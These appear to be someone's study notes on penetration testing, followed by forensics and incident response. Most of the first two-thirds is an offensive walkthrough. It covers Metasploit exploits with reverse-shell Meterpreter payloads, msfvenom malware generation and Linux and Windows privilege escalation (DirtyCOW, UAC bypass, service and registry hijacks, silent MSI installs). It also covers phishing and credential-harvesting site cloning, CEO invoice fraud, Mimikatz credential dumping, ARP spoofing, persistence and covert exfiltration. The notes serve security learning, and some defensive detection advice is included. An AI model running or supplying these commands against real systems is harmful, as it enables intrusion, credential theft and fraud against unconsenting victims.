					curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
					chmod 755 msfinstall
				    sudo ./msfinstall 
				Setup>
					sudo chmod 775 /opt/metasploit-framework/apps/pro/ui/config/database.yml
					service postgresql start
					service metasploit start		
					msfconsole		
					db_status
				msf promt>
					//Find an exploit in Metasploit's DB, EG windows XP exploit
					search ms08-067
					use exploit/windows/smb/ms08_067_netapi
					//List payloads
						search payload
						//Find one for windows
						//EG
							//payload/windows/meterpreter/reverse_tcp
								//effective malware, but well known by antimalware
								//instead of creating a listening service waiting for us to connect, the target will instead connect back to us.
								//Outbound connections aren't normally protected by firewalls
					set PAYLOAD windows/meterpreter/reverse_tcp
					//Set options
						options
						//Set target remote host
							set RHOST 192.168.182.154
						//Set the localhost	
							set LHOST 192.168.182.138
					exploit
					getuid
					screenshot
					
		Patch Cycles and End of Support>
			Implement patches as soon as they are released or your systems may be vulnerable.
			 larger organisations struggle with this
			Most organisations have a patch cycle system where there is an approved delay between a patch being released and it being implemented, dedicated to testing that patch.
			Priority should be given to systems that carry critical data and also systems that are most at risk				
			Software at the end of support should not be used, such as WinXP
			
		Social engineering>	
			tricking someone into performing an action which is against their best interests.
			Usefull when little internet facing services, since web sites are hosted by providers and email services hosted by google/Outlook 365
			 So you cant get a foot in the network
			Pretexting>
				call (or email) the target and present yourself as someone else.
				Requires quite a high level of information gathering on the target and psychological insight to say the right thing
			Phishing>
				Craft an email which encourages people to click on a malicious link or to execute a malicious file
			 	 Send to many people
				Spear phishing
				 Email crafted with a specific target in mind 
				Generally target certain departments: Legal, human resources, accounting
				 almost always good targets because their jobs involve accepting documents from sources outside of the company (EG send a malicious word document disguised as a CV)
			Word Macros>			
				MS word have macros which allows code to be executed when the document is opened
				Office has security settings enabled by default that warn the user
				 Some software that legal departments use for tracking cases integrates with Word using macros so they are enabled
				 Otherwise, you can increase the chances that someone will click on 'enable content' by crafting the content of the Word document (take adv of MS vague warning)
				 https://www.hackingloops.com/creating-malicious-word-macros-tutorial-autorun-stub-via-word-document/
			PDFs>
				Some PDF readers are vulnerable
				the PDF protocol itself is vulnerable to social engineering
				 embed an exe file into a PDF and have an icon in the PDF which runs the program when a user clicks on it. 
			Drive-by Download>
				an attacker compromises a site that their target visits often and installs malware which takes advantage of security holes in the target's browser to compromise them when they visit. 
				Recently attackers have been hacking sites and installing cryptojackers on websites without the website owners knowing 				
				Browser plugins such as Flash Player and Java applets have lots of vulnerabilites
			     Sometimes they use JS to scan the target's browser and pick the exploit that is mostly likely to work based off browser pluggins
				 
				Use the 'social engineer toolkit' for this one. It's a tool available on Kali under Applications -> 08 Exploitation Tools
				  Chose Social-Engineering Attacks -> Website Attack Vectors -> HTA Attack Method -> clone a site
				  -> enter IP or use the autodetected IP -> chose port for the listener -> choose payload (use HTTPS for the malware and the users PC to communicate) 
			Credential Harvesting>  
				attacker clones and hosts a site -> trick someone to visit it and enter login details -> hacker takes details while the user is redirected to the legitimate site silently	  
				Make believerable: domain name with one letter difference,  utilise browser flaws which allow one URL to be displayed as another entirely
				Use SET
					Chose Social-Engineering Attacks -> Website Attack Vectors
					 -> Credential Harvesting Attack Method -> Enter report IP -> Enter site to clone
			CEO Fraud (whaling)>
				Monitor target company, possibly get into their email system to read correspondence and schedules.
				Wait for CEO to go on holiday -> send email to accounts department and ask for a particular invoice to be paid immediately -> they see the invoice is overdue and pay it
				 or after gaining acess to email system, change some account numbers in the invoice before the invoice is paid
				
				Hard to get found: Event undetected for weeks, target small-medium business without the necessary security infrastructure to track down an atk, no logging 
				
	Privilege Escalation>
		Linux>
			//When you hack a system, either by exploiting a service, or sending a user a piece of malware, you gain access to that system with the same level of privileges as the service or user in question. 
			//Change ownership of a file to root
			sudo chown root:root ./demo
			-halt

			Exploiting Services>
				//Use local exploits to atk services not listening on the network

				//List running processes
				ps auxf
				//Identify software that is running and version numbers, then look for exploits in exploit-db
				//Check filesystem for installed software thats not always running

			Exploiting the Kernel>
				//Get kernel version
				uname -a	
				// linux kernel [version] exploit

				EG DirtyCOW for Linux Kernel 4.4.0-31
					//allowed an unprivileged user to overwrite a non-writeable file (file changed in memory)
					//download script from exploit-db and compile
					gcc -pthread dirty.c -o dirty -lcrypt
					//Run, enter password, then confirm line that will be written to /etc/passwd
					./dirty
					//Change user
					su pwned

			Wildcard Injection>
				//Take adv of how params are passed to programs
				//EG to delete files in the current directory (-r is needed to delete folders)
				rm *
				//Create a file called -rf, when you run rm * -rf will get injected and delete files/folders in the current directory

				//Reminder: crom jobs are scheduled tasks on linux, 
				//EG Rsync command used to sync the contents of two folders, -e allows to execute commands during the process
				Rsync -e
				//Create a .c file -> add shell codes, EG /usr/bin/whoami > whoami_result.txt
				//Create a file called -e sh file.c
				//The cron job runs a command such as 
				sudo rsync -t *.c foo:src/
				//The code in the .c file is executed with the cron jobs permissions

			Exploiting SUID (Set user ID) and SGID (Set Group ID)>
				// Sometimes a program needs root permissions to function, but it may also need to be available for non-root users to run it. 
				 // They need SUID/SGID permssions
				//SUID: a program permission that allows it to run with the owners privallges
				sudo chmod u+s ./demo
				//SGID: SUID but runs at group owners privallege level

				SUID Files>
					Look for binaries with SUID or SGID permissions set that are owned by the root user
					//Repersented by an s in file permission listings
					find / -perm -4000 -user root -type f -print 2>/dev/null
					find / -perm -2000 -user root -type f -print 2>/dev/null
					//Exploit these programs or see if they execute scripts that can be written to

					//Check for programs that execute scripts based on an environment variable
						ls -halt
						//Check it for $SCRIPT_PATH EV
						strings [vulnerableFile]
						//Look for that file and see if it you can edit it
						echo $SCRIPT_PATH
						//If you cant edit it make a new script in a different file and change the environment variable
						//EG  Create file with #!/bin/bash	whoami
						export SCRIPT_PATH=[pathToScript]
			sudo>
				//Allows normal user to run things as root
				//sudoers config file specifies who can run which commands as root
				//Get a root shell with sudo
				sudo find /etc -exec sh -i \;


		Windows>
			metasploitExploitSetup = () => {
				set PAYLOAD windows/meterpreter/reverse_tcp
				show options
				set SESSION 1
				//AV are bad at detecting powershell scripts
				set TECHNIQUE PSH
				set LHOST [localIPAddress]
				set LPORT 1338
				exploit
			}
			metasploitCreateAListener = () => {
			//Create a listener waiting for the new connection (in a second terminal window)
				use exploit/multi/handler
				metasploitExploitSetup()
			}
			metasploitRestartServiceAndMigrate = () => { 
				//Restart the service
					//Unlikely to work
						sc stop [vulnerable service]
						//Restart pc, not stealthy
						shutdown /r /t 0
				//The second terminal listener will immediately get a connection
					//Migration it quickly (Windows will think the service crashed and attempt to restart it, by migrating we can swap to a different process and even when Windows kills our original process our connection survives)	
					run post/windows/manage/migrate	
			}
			metasploitCreateMaliciousFileAndCreateAListener(){
				//Create a malicious file to upload and a listener to receive its connection
					//Open anouther terminal window
						//Create malicious file 
							msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=[localhost] LPORT=[localPort] -o malware.exe
							metasploitCreateAListener()
			}
			
			System > admin > normal user
			//The system user is reserved for system services which allow the OS to function
			//Reminder: admin executes a program -> be dropped to lower privileges unless the program needs higher privileges 
			// -> If it needs them a UAC popup will occur
			
			//Most examples already expect you to be in a situation where you are in a unprivileged Meterpreter session (have a shell within the target computer)
			Bypass UAC>
				Metasploit>
					Ask the user>
						//This triggers a UAC warning and if the user accepts you get privileged access
						//EG 
							use exploit/windows/local/ask
							metasploitExploitSetup()
							//Get OS info
							getuid
							//Get current permissions
							run post/windows/gather/win_privs
							//Get system privalleges
							getsystem
					bypassuac module>
						//Automatically tries a few different exploits to bypass UAC without user interaction:
						use exploit/windows/local/bypassuac
						metasploitExploitSetup()
						
					
			Kernel exploits>
				//Check if an OS is missing any patches, pick one to exploit
				use post/windows.gather/enum_patches
				metasploitExploitSetup()
				
				// EG kitrap0d for windows XP, gives system privalleges
				search ms10-015
				use exploit/windows/local/ms10_012_kitrap0d
				metasploitExploitSetup()
				
		 	Stored Credentials>
		   		//find passwords lying around on the file system
				//Usually the case where the system has been built in an enterprise environment as an unattended install
				//During the process of an automated script setting up the system, some config files are used to determine the 
				// account username and password, if the script has been misconfigured some files may get left behind
				//Check
				    C:\unattend.xml
					C:\Windows\System32\
					C:\Windows\System32\sysprep\
					C:\sysprep.inf
					C:\sysprep\sysprep.xml
					C:\Windows\Panther\
					C:\Windows\Panther\Unattend\
						<Password>
							<Value>cGFzc3cwcmQhCg==</Value>
							<PlainText>false</PlainText>
						</Password>												
						echo "cGFzc3cwcmQhCg==" | base64 -d
			Target services>			
				Unquoted Service Paths>
					//Method to elevate to system if UAC exploits arent working
					//Look for unquoted service paths, some services run as system user		
						wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
					What paths you can exploit>
						//proper service path
						 //"C:\Program Files\Vuln Service\Application Files\program.exe"
						//No quotes 
							//C:\Program Files\Vuln Service\Application Files\program.exe
							//Windows will try
							//C:\Program.exe -> C:\Program Files\Vuln.exe -> C:\Program Files\Vuln Service\Application.exe -> C:\Program Files\Vuln Service\Application Files\program.exe
							//What ever location you have privallges to create fiiles, create a malicious .exe file 
							//C:\Program.exe is unexploitable since users dont have access to write to the C drive
					//EG exploit   C:\Program Files\Vuln Service\Application Files\program.exe
						//Find folder permissions
						icacls "C:\Program Files\Vuln Service"		
						metasploitCreateMaliciousFileAndCreateAListener()		
						//Exit shell
							exit
						//Upload malicious files
							cd C:\ -> cd "Program Files" -> cd "Vuln Service"						
							upload -f Application.exe
						//Now we just need to restart the service so that the exploit is run and we gain access
						metasploitRestartServiceAndMigrate()
						
					//Do the above example in one go
					use exploit/windows/local/trusted_service_path						
				Weak Registry Permissions>
					//Every service on Windows has a matching registry key, which holds all the information about the path (and the other settings) to the service executable.
					//Download tool to look at registry permissions from the command line, run installer on windows VM to get the subinacl.exe file
					https://www.microsoft.com/en-us/download/confirmation.aspx?id=23510
					//Make sure you are in C:\users\usermode\AppData\Local\Temp
					pwd
					//Upload file
					upload -f subinacl.exe
					//Registry key with service info
						//HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<SERVICENAME>
					//Drop back to the shell
						shell
					//List running services
						wmic service get name,startname
					//Display permissions
						subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display
					//Create a malicious file to upload and a listener to receive its connection
					metasploitCreateMaliciousFileAndCreateAListener()		
					//Exit shell
							exit
						//Upload malicious files
							upload -f malware.exe
					//Drop back to shell, update registry entry
						shell
					reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /t 
					REG_EXPAND_SZ /v ImagePath /d "C:\Users\usermode\AppData\Local\Temp\malware.exe" /f
										
					metasploitRestartServiceAndMigrate()

				Weak Folder Permissions>
					//find a service which has an executable in a folder that you are allowed to modify, swap executable for your own malware
					//List folder permissions
					icacls "C:\Program Files\Vuln Service\Application Files"
					//Similar to previous two
					List the permissions using 'icacl's -> Generate a malicious program using 'msfvenom' called program.exe.
					-> In a new terminal window, start an instance of 'exploit/multi/handler' to listen for the connection when the malware runs.
					-> Upload your malicious 'program.exe' into the 'C:\Program Files\Vuln Service\Application Files\', overwriting the existing 'program.exe`'
					-> Restart the service (if you have permission), or wait for the computer to reboot, or send the shutdown /r /t 0 command to forcefully reboot the computer. When the service runs, the connection will come into your exploit/multi/handler listener.
				
				AlwaysInstallElevated>
					//The 'AlwaysInstallElevated' setting can be enabled on Windows through Group Policy. 
					// Some administrators will configure this so that users can install software on their computers without administrator approval 
					
					//Check if its configured by checking these paths
					HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
					HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
					
					reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
					reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
					
					//Create a new terminal window		
						//Create .msi installer to run exe, create liscener to receive connection
						msfvenom -f msi-nouac -p windows/exec cmd="C:\Users\usermode\AppData\Local
						metasploitCreateAListener()
					//Upload files to the temp folder
					cd %temp%
					upload -f mal.exe
					upload -f mal.msi
					//Run malicious installer
						shell
						// /quiet: no user messages, /qn no GUI, /i run as a normal user 
						msiexec /quiet /qn /i mal.msi	 
	Persistence>
		//goal is to maintain their connection over a longer period of time
		Indicators of Compromise (IoCs)>
			Ports>
				Linux>
					//EG trying to find a listener that starts when the computer does and waits for an atacker to connect
					//Check listening ports
						netstat -pultn
					//Find out what files the process is using
						lsof -p [processID]
					//Hackers more creactive actions>
						Open the port only at a certain time every day for a certain duration. 
						Make a DNS request to a certain domain, and if the domain resolves to a specific IP address, open the port. 
						target web server, change the PHP to start the listener when a specific request is sent to a page,
						Replace the netstat, lsof and any other programs that could be used to find open ports with custom binaries, which do exactly the same thing except refuse to show the port the malware is listening on.
				Windows>
				//Find open ports
					netstat -a -b -o
			Start-up items>
				Linux>
					Runlevels>
						//specifies which mode the OS is running under
							//0: shutdown, 1: single-user mode (kind of like safe mode), 2 through 5: multi-user / normal modes
							//6: reboot
							//See current run level
							runlevel
							//See software configured to run at level 5 (their symlinks/shortcuts)
							ls /etc/rc5.d/
							//Some distro's location to store software that starts at boot
							/etc/rc.local
					Systemd>
						//Method to run software at boot
						//Check services
						systemctl
						//Most of them are located in
							/lib/systemd/system/*.service
							/etc/systemd/system/*.service

				Windows>
					Start-up Folder>
						//Malware will be run on startup but wont have admin privillages
						C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
						C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
					Registry>
						//Check these enteries, some will run as admin (EG service keys), some as current user
						/*
							HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute
							HKLM\System\CurrentControlSet\Services
							HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
							HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
							HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
							HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
							HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify
							HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
							HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
							HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
							HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
							HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
							HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
							HKLM\Software\Microsoft\Windows\CurrentVersion\Run
							HKCU\Software\Microsoft\Windows\CurrentVersion\Run
							HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
							HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
							HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
							HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\load
							HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows
							HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\SharedTaskScheduler (Windows XP or prior)
							HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs

							HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon\Userinit\userinit.exe
							-> HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon\Userinit\userinit.exe

						*/
						//Use autoruns from sysinternals
					Services>
						//Use privilege escalation to configure start at boot
						//You could re-use an existing service if you suspect it is unused, or create a new service with a benign name.
					Installed components>
						//Executables that are run at boot time
						HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\[Random String]\StubPath\malware.exe
			Shortcuts>
				//On Windows, shortcuts can be hijacked to run code when a user is interacting with the system.
				//PS script to carry out a command when ever the user tries to copy something
					$WShell = New-Object -comObject WScript.Shell
					$Shortcut = $WShell.CreateShortcut("desktop\payload.lnk")
					$Shortcut.TargetPath = "%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"
					$Shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,21"
					$Shortcut.hotkey = "ctrl+c"
					$Shortcut.Arguments = 'calc'
					$Shortcut.Save()
				//Or look for extenion that the user doesnt use and assign it to a common shortcut

			Rootkits>
				//Rootkits are a form of malware designed to allow an attacker back into a system at a later date
				//usermode rootkit
					//runs as a user in the system
					//Tries to hide itself by replacing system binaries with custom versions that report correct info 
					 // except for info that would compromise the rootkit's presence
				//kernelmode rootkit
					//Lives in the kernel and can change the results of kernel calls
					//Since the kernel controls the way programs communicate with the hardware, instead of replacing binaries it can give fake responses to programs
					 //EG  when the 'netstat' (or any other program) program runs and it asks the kernel for a list of open ports, the kernel will respond with all the open ports except for the one that the rootkit is using. 
				//Things to look for	 
					//Your settings keep changing without user interaction  (or if you are on Active Directory, without the Administrator changing them).
					//input devices keep disconnecting and reconnecting.
					//anti-malware software stops running and cannot be started again.	
					//Network traffic coming from the computer (monitored externally such as at the switch) shows traffic on certain ports, but the computer in question reports those ports are closed

				Bootkits>
					//At high privilege levels, malware can write directly to the disk without having to use the file system as an intermediary
					//Write code to master boot record
					//Some can survive after a disk wipe or re-partition by persisting in the hard disk's firmware.
					 // If so the only way to remove the bootkit would be to both erase the drive, and re-flash the hard disk with its original firmware.
				Recovering from a rootkit>
					wipe and re-partition the drive -> install a fresh OS
					Linux: rkhunter
					Windows: Normal anti-malware suites rootkit scanners, TDSS Killer, Malwarebytes anti-rootkit, Rogue killer, GMER
			Word> 
				Templates>
					When Microsoft Word is first launched, the blank document is loaded from a template file.
					replace the template file with one containing macro-based malware, activate when opened/saved and infect when document is sent
					However: Must have macro warning disabled (or target has them as so they are alerted to the breach)
					Normally used by worms since its too detectable
				Add-ins>
					Third parties can write add-ins, which extend the functionality of Microsoft Word	
					Older word versions have several default trusted paths where add-ins can be placed so that they launch when Word launches,
					%APPDATA%\Micosoft\Word\StartUp\

					dll files (dynamically linked library): a code repository that other external programs can access to run the code contained within
					Microsoft .wll files can host executable code, drop a dll in the folder and rename to .wll
			Yara>
				Statistic signature detection tool to detect indicators of compromise (works on static files instead of checking behaviour)
				Scan system -> compare results to a database -> flag user if it detects an indicator
				Anyone can write rules for it quickly and easily
				Unknown malware or manual exploitation dont have rules written for it

				https://virustotal.github.io/yara/
				https://yara.readthedocs.io/en/latest/gettingstarted.html#compiling-and-installing-yara
				https://github.com/Yara-Rules/rules

	Lateral Movement>
		//Established foothold on the network -> elevated their privileges -> persisted, now they need to spread through the network to get to the target system
		//Use some techniques from initial exploitation			
		//Atk systems on the network of the initially compromised system
			//EG turn it into a proxy, routing the connection of their own system through the compromised system to run all their tools within the network
			//Or if not use installed tools or install tools on the compromised system
		//Most at risk of discovery, particularly if in the DMZ (De-militarised Zone, high risk network area) which has defences between it and the rest of the network
		
		ARP (address resolution protocol) Cache>
			//Map the network, espcially if you dont have access to a portscanner
			//Protocol used on local networks to map IP addresses to MAC addresses
			//ARP responses are saved in the ARP cache, so it shows connected computers (also this means traffic looks less suspicious)
			arp -a
		Port Scanning without nmap>
			powershell>
				// Win7 versions have 
				$Server = Read-Host -Prompt 'Input your target IP/host' ; 1..65536 | % {$test= new-object system.Net.Sockets.TcpClient; $wait = $test.beginConnect("$Server",$_,$null,$null); ($wait.asyncwaithandle.waitone(250,$false)); if ($test.Connected){echo "$_ open"}else{echo "$_ closed"}} | select-string " "

				$Server = Read-Host -Prompt 'Input your target IP/host' ; 1..65536 | % 
				{$test= new-object system.Net.Sockets.TcpClient; 
				$wait = $test.beginConnect("$Server",$_,$null,$null); 
				($wait.asyncwaithandle.waitone(250,$false)); 
				if ($test.Connected){echo "$_ open"}else{echo "$_ closed"}} | select-string " "
			Linux>
				nc -z -v -w 1 192.168.0.92 1-1338
				Write a port scanner in C and compile it
		Extracting Passwords from Memory>
			/*
			With SYSTEM or root privileges on the staging system, you'll be able to access RAM to extract password hashes or even plaintext passwords.
			Often these credentials will be valid for other systems on the network, particularly if Active Directory is used on the network 
			Can use hashcat to crack weak password hashes
			Gain access to info to be used in social engineering or info gathering
			Mimikatz tool
				privilege::debug
				sekurlsa::logonpasswords
			*/
		Man in the Middle Attacks>
			//insert yourself into the middle of communication between two systems on the network and using that to sniff traffic			
			//Computer A -> Compromised Computer -> Computer B		
			//Intercept pw hashes
			
			ARP Spoofing / Poisoning>
				/*
				A switch uses a MAC address to direct packets transmitted on the local network 
				ARP response is sent to a computer -> stores it in ARP cache even if it didn't make an ARP request asking for a response. 
				 So any computer on the local network can claim to be any IP address even if they aren't that computer. 
				
				EG
					Computer A (192.168.0.5 / A0-D8-98-48-F0-00) -> Computer B (192.168.0.201 / A6-2E-BD-BF-5A-FC)
				 	Hackers PC is Computer C (192.168.0.12 / 6C-5B-C3-03-B3-71), so the aim is
					CA (192.168.0.5 / A0-D8-98-48-F0-00) -> CC (192.168.0.12 / 6C-5B-C3-03-B3-71) -> CB (192.168.0.201 / A6-2E-BD-BF-5A-FC)				 
					Hacker sends ARP responses to CA saying:
						"I'm 192.168.0.201 and my MAC address is: 6C-5B-C3-03-B3-71"
					Hacker also sends ARP responses to CB saying:
						"I'm 192.168.0.5 and my MAC address is: 6C-5B-C3-03-B3-71"
					So CA and CB think their target IP address is at CC's MAC address, 
					So switch sends data to the attacker which will read and forward them
					
					Usually detected at the switch level, some have built-in ARP spoof protection
					look for any ports on the switch that have duplicate MAC addresses.
				*/	
			LLMNR, NBT-NS and MDNS Poisoning>
				These protocols are often used on active directories networks as a fallback for when there are no entries for hosts in a DNS server
				EG \\FileServer\Share works but FileServer listed in the local DNS server
				Run responder.py to get pw hashes coming over the network
		PSExec>
			Legitimate PowerShell module designed for network administrators to allow them to run PowerShell commands remotely on multiple systems at once.
			if you have login credentials to a system you can directly use PowerShell to run malware on that system. 
	Exfiltration>
		/*
		Security controls at the endpoint and network layer try to prevent data extraction, so it needs to be hidden
		Use a careless exfiltration attempt to get the attacker			
		Could send data via HTTPS to a comprimised computer (so it looks like someone is browsing the internet)
		Pay attention to the scale of data that needs to be transmitted
		*/
		For common protocols you can hide as generic traffic, also they will be allowed out past the firewall	
		HTTPS>
			/*
			Adv: Encrypted, common protocol, often used to transfer large files
			Detect it>
				Where its going HTTPS traffic is going
					Any domain names that link to sites that could be used to store info (EG github gists, facebook posts)
					Or they may use their own server
				Set up a network device to use as a web proxy and make sure all clients connect to the internet through the proxy.		
					Any malware will try to connect to the internet directly, when it does log it
				Set up a network device to use as a web proxy and enable SSL interception on it.	
					SSL interception is a feature that requires each client to be configured to trust a custom SSL certificate
					HTTPS is decrypted at the proxy and then re-encrypted, so you can read the traffic
			 
			EG email server communicating over HTTPS, though to catch this you need to log email server traffic
			*/		
					
		SMTP>
			/*
			Find credentials for using the company SMTP server on any workstation 
			If the mail server supports STARTTLS it will be encrypted in transit
			If email is outsourced to a cloud provider (EG Microsoft's Office 365, Google's GApp Suite), then network admins cant read
			Detect it>
				inspect outbound SMTP traffic to make sure it is being made to the company SMTP servers
				Be aware of personal email accounts on devices, which may use third party SMTP servers
				inspect messages in transit for restricted keywords
				Check systems where SMTP traffic does not usually originate from (EG FTP server)
			*/
		IRC (Internet Relay Chat)>
			/*
			Used in malware as a command and control channel			
			No encryption, malware can use custom encryption
			Prevent the IRC protocol from leaving a network at the firewall level
			Modern protocols hard to block, EG Telegram which falls back upon multiple protocols
			*/
		DNS>
			/*
			An attacker registers a domain EG myfakedomain.fake -> sets up a DNS server to be authoritative for that domain
			-> malware sends data by making DNS queries -> query sent to the TLD DNS server which will return attackers DNS server IP
			-> DNS server queries attackers domain, the DNS server logs the request which contains the data
			Can encode/encrypt the data before it leaves the network to make the subdomain look random
			
			Log all DNS queries, look for: sub-domains that appear random or long, repeated queries to the same domain but very many subdomains
			*/
			//Translate hex subdomains
			python -c "from binascii import unhexlify; print unhexlify('5468697320697320')"
		ICMP>
			/*
			used for transmitting error messages
			Does contain a data field, but normally only the ICMP header has the codes.
			Hide small amounts of data in a ping packet
			
			Generally not useful so block at the firewall
			*/


Forensics>
	Forensics>
		process of preserving and evaluating electronic data, in order to reconstruct prior events
		Find out if a system has been breached, confirm suspicions that a crime was carried out with a computer
		Deceide on priorities: EG Quick investigation to determine scale of the breach despite lack of evidence for use in court
	Evidence>
		Take notes with clear dates and analyst name, verify conclusions before you note them
	Chain of custody>
		Physical evidence -> forensic captures -> sealable evidence bags, named and dated
	Steganography>
		 practice of concealing data within other data
		 Change pixels in a image to store data
		 modify audio signal in an imperceptible manner
		 In counteries with government taboos and censorship social steganography
		 	Hiding msgs in pop culture references, titles and context of shared media files, mispelling to suggest an alternative meaning
		Detection>
			Steganalysis (detecting modified files)
		Methods>
			Least Significant Bit (LSB)>
				used in conjunction with steganographic techniques for embedding text into images and also into audio
				Audio signal converted into bits and then text is embedded
			Echo hiding>
				robustness in compression, imperceptibility and capacity
				hidden sounds triggering smart devices (Alexa) and ringtones only younger people can hear
		Tools>
			Crypture
				CLI tool, hide your sensitive data inside a BMP image file.
			Binwalk
				Tool for searching a binary image for embedded files and executable code
				Specifically desgined for firmware images
			Steghide
				CLI tool, hide your secret file inside an image or audio file
				commands
				clem	info,--info - Display information about a cover or stego file.
					-ef,--embedfile filename - Specify the file that will be embedded (the file that contains the secret message)
					-cf,--coverfile filename - Specify the cover file that will be used to embed data
					-sf,--stegofile filename - Specify the stego file (the file that contains embedded data)
					-xf,--extractfile filename - Create a file and write the data embedded in the stego file to it
			rSteg
				Java based tool that lets you hide textual data inside an image
				Uses a pin
			OpenStego
				can hide images in BMP, GIF, JPEG, JPG, PNG and WBMP
				You can hide data in these files and take output as a PNG file
				
		Find it>
			//Zoom in on the image to see if small things visually hidden
			//Check file headers
				file [fileName]
			//Read strings	
				strings [fileName]
			//Check with steghide if you have a PW
				steghide {} [fileName]
			//Mine meta data
			 	exiftool -k [fileName]
			 
	Event Logs and Log Files>
		When a significant or auditable event happens in Windows, the operating system generates a log file		
		View them with windows event log viewer
		Event Log hierarchy invovles: Application, security, system
		Each event log contains date/time information, usernames and computer IDs, and source and type information
		Event ID specifies the event type, EG most 4624 is a successful login attempt and has a logon field type
		Look in registry to find out system time when the disk capture was made (however the time zone may have been different when the event was logged)
		 Convert all time stamps to UTC
		 
		Tools>
			//Extra data and save
				evtx_dump.py [fileName.evtx] > eventFile
			//Sort and group data
				cat eventFile | grep Computer | sort | uniq -c | sort -nr
			//Check security evtx file
				cat securityEventFile | grep RDP
				//Look a certain amount of lines arround each hit
					cat securityEventFile | grep -a10 RDP
					cat securityEventFile | grep -a20 4624
				//Get more infomation on target username found in previous steps
						cat eventFile | grep [targetUserName] | sort | uniq -c | sort -nr 
					//Cut it down
						cat eventFile | grep [targetUserName] | sort | uniq -c | sort -nr | head -n5
					//Get a column
						cat eventFile | grep [targetUserName] | sort | uniq -c | sort -nr | head -n5 | awk '{ print $1}'
				
				//Check file manually then sort 
					less securityEventFile
					/RDP
					
	File Integrity and Hashes>
		identify if any unauthorised changes have been made to the file and allows us to prove that a file has not been changed.
		Create cryptographic keys by putting a file through a hashing algorithm
		MD5
			 128-bit value, represented by a 32-hexadecimal digit sequence.
		SHA 256
		
		Hash Collisions and Forensics>
			MD5 is broken since it can gernate collisions (2 files have the same hash value)
			Use SHA-1 and MD5 hashes of disk image so even if one hash has collisions the other would be different
			Individual file hashes are not used as defining evidence, if two photo's were manipulated to have the same hash value, visual inspection could suggest tampering

	Incident Response process>
		Incident responders are the first line of defence in most organisations, they respond to and identify threats quickly in order to minimise/contain damage, identify/remediate root cause
		Preparation>
			Focus on people, policy, communications, documentation
			Test incident response plan
		Identification>
			identify the scope
			analysing logs and security events	
			take live captures and analysing systems without tipping off the attacker.	
		Containment>
			changing permissions on critical systems
			logically separating the infected machines from the rest of the network
			Installing monitoring systems that are specifically tailored to this attack
			If you have the user account or malware signature try to catch the attacker
		Eradication>
			applying patches, closing back doors, disabling accounts
		    black holing IP addresses, removing malware and restoring infected machines to previous backups	
			allow time for the monitoring team to see if the attacker has re-entered the environment
			Leave a user account or system in place as a honey pot (attacker tries to use it, when it cant do any damage) 
		Recovery>
			Mass PW reset (even for automated system accounts)
			Carry out patches not exploited in the current environment
			Review access systems
		Lessons Learned>
			Review attack from start to finish
		    Detailed report
			Check policies in place
		Conclusion>
			security team investigate suspicious events -> flag for further investigation -> Forensic analysis 
	Purple team>
		Split blue and red teams limit the potential for collaborating
		EStablish greator communication channels between red/blue to improve cyber security overall
		
	File System Forensics>
		How a file system works>
			Every piece of data has an index -> data organised into directories -> these contain further folders or files
			{Check hard drive heading in hardware section}
			
		Disk captures>
			Hard disk image file formats>
				//Common, compress data and store metadata without affecting the original evidence
				EnCase's E01 
				//Raw image captured (No additional metadata (EG no hashes))
				dd
				//Other image formats
				SMART (Proprietary owned by ASR), AFF (Outdated)
			 Capture forensic images of HD>
				Check if the disk is encrypted> 
					Full disk encryption is where the data is encrypted on the drive when the computer is at rest (decrypted when its on)
					If the computer is on try Magnet's Encrypted Disk Detector to determine if the disk has full disk encryption enabled on it.
					Is encrypted 
						take a live capture (while PC is on) with something like AcessData's FTK imager
					Isn't
						Plug the plug -> remove hard-drive -> connect to a write blocker (allows only reading) and then your PC, can use FTK imager
						Note hash produced and print it out
						
				Deleted Files>
					retrieve and index all the files on the file system (including deleted files not overwritten)
					Can force the operating system to overwrite data to securly delete it, though SSD use wear levelling
					 (moves files around to stop parts of the disk wearing from overuse) so disk controller will move a file before it can be overitten
		
		 	Email Forensics>
				study the source and content of email messages as evidence
				identify the actual sender/date and time/subject/attachments
